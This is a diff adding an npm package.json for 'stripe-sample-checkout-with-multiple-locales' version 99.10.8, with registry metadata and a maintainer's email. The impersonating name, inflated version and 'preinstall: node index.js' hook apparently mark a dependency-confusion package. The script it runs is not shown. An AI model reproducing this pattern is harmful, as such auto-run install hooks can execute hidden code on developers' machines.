@@ -1,0 +1,39 @@
+{
+    "name": "stripe-sample-checkout-with-multiple-locales",
+    "version": "99.10.8",
+    "description": "shopify test package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo \"error no test specified\" && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "stripe-sample-checkout-with-multiple-locales@99.10.8",
+    "_nodeVersion": "14.16.1",
+    "_npmVersion": "6.14.11",
+    "dist": {
+        "integrity": "sha512-WtcZ/6kEGeQEGHEzIneOzRvpZdo4QHlY7+lP1JwNBEhJcYE1YE+thrPDe8c05j3GnCYo4Y2jiVAAFGXUGplUhQ==",
+        "shasum": "a356eabeb6aed207e3e0dffc14729fb44350acb5",
+        "tarball": "https://registry.npmjs.org/stripe-sample-checkout-with-multiple-locales/-/stripe-sample-checkout-with-multiple-locales-99.10.8.tgz",
+        "fileCount": 2,
+        "unpackedSize": 3252,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v3.0.13\r\nComment: https://openpgpjs.org\r\n\r\nwsFcBAEBCAAQBQJhmnpxCRA9TVsSAnZWagAABxsP/1HjSK5YNYcL2ue8DqTD\nImoi7ATwQDisDwrdhw4kNHI9x22OxghRV4KepEcPWvqkbeqOP6HB3GCNForA\nCM71hgUjmPEy+CTyflqkCmaFZmGAV1G3iwzuLCs9TOisGaSOUWfrBGI9POZy\nn/46bwzyqdBRIVT2NYF1UhYy8XqeQWXx8CfPTIZMyOUuW7aXAgysfCh0oMrE\n5ODEZWR4we3pyxYXFYELxgpyKAKIX9p5GWd5RoTenu9H0YH+kkAn4xkb7QHU\nVa3Ar1YPERp7ZLhN1syymacY4ARnMn1QoQcR9vHMqIOZWqYUM9sMCXPs9qzw\n4WciETqoNIlWpp84xY8s4cu6jRObHPatQ4ilvYO5wFr9/SGTRQVMFLIn+3Rp\n7d6Bgc0luY3fu1Tj7Edn9nNpp91TinWhFvV6cWCgyxB+cRBH9g0oUewINOEQ\nkdxIQabILfCOCpTvtCIiXyMyjjOPZET9Xb3gaPmwvgTZLZKazCjTJrGYDvS4\nnLiJC+W4lj7DV3vqAB39NhK8WKPTEOmUK4UrclFr2Nw7kGcJh47u0I2NyeLT\nw8SfaW6zGsmSAJjBVAxt1QoeHHBepdBAEKnmFMXRNDj5h6uCpgtigPgJc8y4\nqxrPclsu85r1nkTwl3MCm3B+ymzqAdTc58iw02iDNofnRAJq8AVMLQg7DdJx\nmwu8\r\n=Xk54\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "hussam22",
+        "email": "hussam.tes09@gmail.com"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "hussam22",
+            "email": "hussam.tes09@gmail.com"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/stripe-sample-checkout-with-multiple-locales_99.10.8_1637513841172_0.6163347350026402"
+    },
+    "_hasShrinkwrap": false
+}
